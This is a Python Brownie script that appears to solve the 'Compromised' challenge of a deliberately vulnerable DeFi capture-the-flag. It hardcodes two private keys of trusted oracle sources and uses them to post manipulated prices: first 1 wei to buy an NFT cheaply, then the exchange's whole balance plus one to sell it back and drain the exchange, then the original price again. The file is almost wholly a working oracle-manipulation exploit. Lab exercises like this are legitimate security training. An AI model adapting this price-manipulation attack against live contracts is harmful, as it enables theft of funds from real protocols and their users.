from brownie import DamnValuableNFT, Exchange, TrustfulOracle, accounts

from scripts.deploy import EXCHANGE_INITIAL_ETH_BALANCE, INITIAL_NFT_PRICE

COMPROMISED_PRIVATE_KEY_1 = (
    '0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9'
)
COMPROMISED_PRIVATE_KEY_2 = (
    '0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48'
)


def exploit(oracle_contract, exchange_contract, dvnft_contract, attacker_account):

    # Attacker controls the private keys of two of the trusted sources
    # it would be possible to use them to setup accounts:
    compromised_account_1 = accounts.add(COMPROMISED_PRIVATE_KEY_1)
    compromised_account_2 = accounts.add(COMPROMISED_PRIVATE_KEY_2)

    oracle_contract.postPrice('DVNFT', 1, {'from': compromised_account_1})
    oracle_contract.postPrice('DVNFT', 1, {'from': compromised_account_2})

    cheap_nft = exchange_contract.buyOne({'from': attacker_account, 'value': 1})

    token_id = cheap_nft.events['Transfer']['tokenId']

    oracle_contract.postPrice(
        'DVNFT', EXCHANGE_INITIAL_ETH_BALANCE + 1, {'from': compromised_account_1}
    )
    oracle_contract.postPrice(
        'DVNFT', EXCHANGE_INITIAL_ETH_BALANCE + 1, {'from': compromised_account_2}
    )

    dvnft_contract.approve(exchange_contract, token_id, {'from': attacker_account})
    exchange_contract.sellOne(token_id, {'from': attacker_account})

    oracle_contract.postPrice(
        'DVNFT', INITIAL_NFT_PRICE, {'from': compromised_account_1}
    )
    oracle_contract.postPrice(
        'DVNFT', INITIAL_NFT_PRICE, {'from': compromised_account_2}
    )
